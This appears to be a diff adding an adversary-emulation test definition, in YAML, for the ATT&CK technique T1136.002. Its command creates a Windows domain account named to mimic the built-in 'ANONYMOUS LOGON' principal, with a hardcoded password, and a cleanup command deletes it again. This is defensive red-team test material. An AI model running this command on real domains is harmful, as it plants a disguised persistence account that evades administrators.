@@ -1,0 +1,15 @@
+- description: 'Create a new account similar to ANONYMOUS LOGON in a command prompt.
+
+    '
+  id: b563c36c-ff8c-0a66-194d-d5a4f1daa1be
+  name: Create a new account similar to ANONYMOUS LOGON
+  platforms:
+    windows:
+      cmd:
+        cleanup: net user "ANONYMOUS  LOGON" >nul 2>&1 /del /domain
+        command: net user "ANONYMOUS  LOGON" "T1136_pass123!" /add /domain
+        payloads: []
+  tactic: persistence
+  technique:
+    attack_id: T1136.002
+    name: 'Create Account: Domain Account'
